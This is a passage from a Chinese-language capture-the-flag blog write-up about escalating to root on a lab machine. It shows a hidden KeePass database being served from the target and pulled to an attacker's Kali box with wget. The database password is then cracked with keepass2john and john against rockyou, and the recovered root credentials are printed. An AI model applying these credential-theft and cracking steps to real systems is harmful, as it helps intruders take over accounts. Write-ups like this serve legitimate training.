</span></span></code></pre></div><p>登录成功，查看系统内核信息和用户权限，发现无法通过这两项提权</p><p>那就先拿个flag，在<code>/home/raphael</code></p><p><img src=img/20240116223221.png alt=image.png></p><p>该目录下同时发现，<code>.kdbx</code>文件，该文件是keepass密码管理器的数据库，内容加密</p><p>靶机开启HTTP服务</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>9861</span>
</span></span></code></pre></div><p>将<code>.chadroot.kdbx</code>文件下载到kali中解密</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# wget http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span class=line><span class=cl>--2024-01-16 22:50:11--  http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span class=line><span class=cl>Connecting to 10.9.23.155:9861... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>2174</span> <span class=o>(</span>2.1K<span class=o>)</span> <span class=o>[</span>application/octet-stream<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘.chadroot.kdbx’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.chadroot.kdbx                   100%<span class=o>[=======================================================</span>&gt;<span class=o>]</span>   2.12K  --.-KB/s    in 0.002s  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-01-16 22:50:12 <span class=o>(</span><span class=m>961</span> KB/s<span class=o>)</span> - ‘.chadroot.kdbx’ saved <span class=o>[</span>2174/2174<span class=o>]</span>
</span></span></code></pre></div><p>使用 keepass2john 和 john 破解该数据库的密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# keepass2john .chadroot.kdbx <span class=p>|</span> tee <span class=nb>hash</span>
</span></span><span class=line><span class=cl>.chadroot:<span class=nv>$keepass$*</span>2*60000*0*d34ff0b3bbce285d4553b994d1377a942145c2066611eeec2b4de8359f92d18c*e1ae12738ee79dabedfaf7f387275bfb4afc77b6943d02c156eabfaac3c2e58b*638b2e50ed9f0e910f7a96dbeb990c6d*4779254b4e0535bbfa31cf2d31a8ef86033ddbc13be2a5b25e9b0b5983448681*d32ea132be90e65089bfb5c7b6fee69019ada50b62d2e11c6d77d92f2856ba1c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# john <span class=nb>hash</span> --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>KeePass <span class=o>[</span>SHA256 AES 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>60000</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>version<span class=o>)</span> is <span class=m>2</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>3</span> <span class=o>(</span>algorithm <span class=o>[</span><span class=nv>0</span><span class=o>=</span>AES <span class=nv>1</span><span class=o>=</span>TwoFish <span class=nv>2</span><span class=o>=</span>ChaCha<span class=o>])</span> is <span class=m>0</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>chatter          <span class=o>(</span>.chadroot<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:03:21 DONE <span class=o>(</span>2024-01-16 23:04<span class=o>)</span> 0.004961g/s 133.8p/s 133.8c/s 133.8C/s colombiano..candyapple
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span></code></pre></div><p><img src=img/20240116230500.png alt=image.png></p><p>使用<a href=https://app.keeweb.info/>https://app.keeweb.info/</a>网站在线查看密码数据库，使用第三个密码</p><p>得到root用户和密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>用户：root
</span></span><span class=line><span class=cl>密码：.:.subjective.:.
</span></span></code></pre></div><p>登录root用户，提权成功</p><p><img src=img/20240116231234.png alt=image.png></p><p>夺旗flag</p><p><img src=img/20240117085313.png alt=image.png></p></article><div class=author-card><div class=underline></div><div class=author-box><div class=author-image><a href=/zh-cn><img src=/images/avatar.jpg alt=Jack></a></div><div class=author-content><p class=author-title>作者</p><p class=author-name>Jack</p><p class=author-desc>网络安全从业者，不知名三分熟摄影师。喜欢探索新领域，对摄影、电影和运动有极大兴趣，平时喜欢折腾一些无用但又有趣的东西。</p></div></div></div></div></main><div class="footer gradient-2"><div class="container footer-container"><div class=row><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>网站地图</div><ul class=list-unstyled><li><a href=https://www.inecho.cc/zh-cn/tags/>标签</a></li><li><a href=https://www.inecho.cc/zh-cn/categories/>分类</a></li><li><a rel=alternate type=application/rss+xml href=https://www.inecho.cc/zh-cn/index.xml><i class="fas fa-rss-square"></i> RSS 订阅</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>社群</div><ul class=list-unstyled><li><a href=https://github.com/shaform/hugo-theme-den/ rel=noopener target=_blank>GitHub</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>连结</div><ul class=list-unstyled><li><a href=https://github.com/shaform/hugo-theme-den/ rel=noopener target=_blank>关于我</a></li></ul></div><div class="col-xs-12 col-sm-3 col-md-3 col-lg-3"><p class="pull-right text-right"><small><em>Proudly powered by <a href=https://gohugo.io/ rel=noopener target=_blank>Hugo</a></em></small><br><small><em>Theme - <a href=https://github.com/shaform/hugo-theme-den rel=noopener target=_blank>Den</a></em></small><br><small>&copy;
Jack
2024</small></p></div></div></div></div><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js integrity=sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49 crossorigin=anonymous></script><script src=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js integrity=sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy crossorigin=anonymous></script></body></html>